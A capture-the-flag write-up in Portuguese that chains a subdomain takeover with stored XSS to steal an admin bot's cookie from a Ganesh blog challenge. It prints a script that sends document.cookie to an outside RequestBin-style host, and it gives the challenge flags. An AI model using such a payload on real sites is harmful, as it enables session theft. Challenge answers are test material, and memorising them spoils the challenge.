# Ganesh Web Cloud ~ Subdomain Takeover + XSS

## Investigando o Desafio

Neste desafio nos deparamos com uma página de um blog simples que contem as seguintes páginas:

- **Homepage:** Contém uma lista de posts cujos links levam para uma mesma postagem (provavelmente a única do desafio), uma barra lateral que nos permite enviar links para um administrador (provavelmente sendo usada por algum bot) e dois links no rodapé para as páginas dos autores.
- **Autor Charles/Van Loon:** páginas simples com o nome dos autores, um background simples e nenhuma capacidade de iteração adicional. Porém localizadas em um subdominio do blog (http://charles.blog.ganeshicmc.com:8001/ e http://vanloon.blog.ganeshicmc.com:8001/)
- **Post do Blog:** um post simples com formulário para comentário que reflete na página (não salva num DB, apenas cria uma url) e que parece estar sanitizando o input contra XSS. (http://blog.ganeshicmc.com:8001/blog/diario-viajante-ep7/)

Analisando o JS da página não encontramos nada que possa indicar algum possível DOM-XSS e vemos que um cookie está sendo configurado:

```
Set-Cookie: flag=Ganesh%7BYou_4re_N0t_Th3_4dmiN_baka%7D; Domain=blog.ganeshicmc.com; Path=/
```

## Parte 1 ~ Descobrindo o Subdomain Takeover

A primeira etapa do desafio necessita que o usuário perceba que as páginas dos autores não levam para um novo path e sim para um subdomínio. Percebendo isso podemos utilizar algum utilitário de DNS para descobrir que os subdomínios foram configurados como CNAME para um hostname `myprofile.ganesh.icmc.com` que pode ser acessado pela url http://myprofile.ganeshicmc.com:8001/. 

## Parte 2 ~ Estudando o Myprofile

Dentro do Myprofile, encontramos um serviço em que podemos fazer as seguintes ações:

- **Login/Registro** dado um par usuário e senha podemos criar ou entrar em uma conta existente no sistema. Não é vulnerável a SQL injection.
- **Editar Perfil** dentro da conta temos um formulário com dois campos:
  - **Custom Domain:** permite atrelar um domínio à sua conta.
  - **HTML Content** permite inserir texto HTML válido.
- **Visualizar perfil** exibe o conteúdo inserido de HTML Content na página anterior sem nenhum tipo de sanitização.

## Parte 3 ~ Encontrando Subdomínios vulneráveis

Dado que Myprofile existe e nos permite criar páginas com payloads XSS ao nosso dispor, queremos encontrar outros subdomínios do blog que apontem para o Myprofile mas que estejam disponíveis para uso (vanloon e charles no caso já estão sendo utilizados). Para isso podemos ter 2 métodos:

- **1º - Bruteforce aleatório:** testar combinações de caracteres alfanuméricos para encontrar subdomínios do blog que apontem para myprofile, OU
- **2º - Ataque de Dicionário** testar subdomínios dado uma lista de possibilidades.

Neste desafio o objetivo era que o jogador percebesse, ao analisar o HTML da página inicial do blog, que além dos autores Van Loon e Charles havia uma série de outras tags HTML comentadas que poderiam servir como fonte para criação de um dicionário para testes de subdomínios:

```html
<a style="display: none;" data-author="arabe" href="#" onclick="window.location=`http://${this.dataset.author}.blog.ganeshicmc.com:8001/`">Arabe</a>
<a style="display: none;" data-author="baqueta" href="#" onclick="window.location=`http://${this.dataset.author}.blog.ganeshicmc.com:8001/`">Baqueta</a>
<a style="display: none;" data-author="bio" href="#" onclick="window.location=`http://${this.dataset.author}.blog.ganeshicmc.com:8001/`">Bio</a>
<a style="display: none;" data-author="brandt" href="#" onclick="window.location=`http://${this.dataset.author}.blog.ganeshicmc.com:8001/`">Brandt</a>
<a style="" data-author="charles" href="#" onclick="window.location=`http://${this.dataset.author}.blog.ganeshicmc.com:8001/`">Charles</a>
...
<a style="" data-author="vanloon" href="#" onclick="window.location=`http://${this.dataset.author}.blog.ganeshicmc.com:8001/`">Van Loon</a>
<a style="display: none;" data-author="vini" href="#" onclick="window.location=`http://${this.dataset.author}.blog.ganeshicmc.com:8001/`">Vini</a>
```

Para evitar a extração manual, o seguinte snippet poderia ser usado no console para extrair a lista:

```javascript
Array.from(document.getElementsByClassName('authors')[0].getElementsByTagName('a')).map(x => x.dataset.author)
```

Com isso, testando as combinações de subdomínios descobririamos alguns vulneráveis para takeover tal como `guerra.blog.ganeshicmc.com`

## Parte 4 ~ Criando o Payload

Encontrado um subdomínio vulnerável, podemos cadastrar uma conta no Myprofile, cadastrar o domínio `guerra.blog.ganeshicmc.com` e criar um payload que extraia os cookies e envie para algum RequestBin ou outro local de nosso controle como o seguinte:

```html
<script>alert('xss');</script>
<script>fetch('https://ent6k7fximtwm.x.pipedream.net/c=' + document.cookie);</script>
```

Com isto basta enviarmos o link (http://guerra.blog.ganeshicmc.com:8001/) para o administrador e recuperar a flag:

```
Ganesh{S0_th4ts_th3_r3As9n_I_n33d_to_1e4rN_W3b_4nd_NeTw0rkS_Hmmm}
```


